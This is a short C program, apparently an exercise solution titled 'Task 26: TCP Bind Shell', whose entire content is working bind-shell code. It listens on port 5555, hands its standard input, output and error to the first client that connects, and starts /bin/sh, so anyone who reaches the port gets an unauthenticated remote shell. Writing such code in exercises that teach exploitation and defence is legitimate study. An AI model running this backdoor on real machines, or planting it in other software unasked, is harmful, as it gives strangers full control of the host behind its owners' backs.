#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

/**
 * Task 26: TCP Bind Shell
 *creates a listening socket on port 5555.
 * When a client connects, it redirects stdin, stdout, and stderr
 * to the client socket and spawns a shell (/bin/sh).
 */

int main(void) {
  int sockfd, clientfd;
  struct sockaddr_in server_addr;

  // 1. Create a TCP socket
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0) {
    perror("Socket creation failed");
    return -1;
  }

  // 2. Initialize the sockaddr_in structure
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(5555);
  server_addr.sin_addr.s_addr = INADDR_ANY;

  // 3. Bind the socket to the port and address
  if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
    perror("Bind failed");
    close(sockfd);
    return -1;
  }

  // 4. Listen for incoming connections
  if (listen(sockfd, 0) < 0) {
    perror("Listen failed");
    close(sockfd);
    return -1;
  }

  printf("Listening on port 5555...\n");

  // 5. Accept a client connection
  clientfd = accept(sockfd, NULL, NULL);
  if (clientfd < 0) {
    perror("Accept failed");
    close(sockfd);
    return -1;
  }

  // 6. Redirect stdin (0), stdout (1), and stderr (2) to the client socket
  for (int i = 0; i <= 2; i++) {
    if (dup2(clientfd, i) < 0) {
      perror("dup2 failed");
      close(clientfd);
      close(sockfd);
      return -1;
    }
  }

  // 7. Execute /bin/sh
  char *args[] = {"/bin/sh", NULL};
  if (execve("/bin/sh", args, NULL) < 0) {
    perror("execve failed");
    close(clientfd);
    close(sockfd);
    return -1;
  }

  // Close descriptors (though execve replaces the process image on success)
  close(clientfd);
  close(sockfd);

  return 0;
}
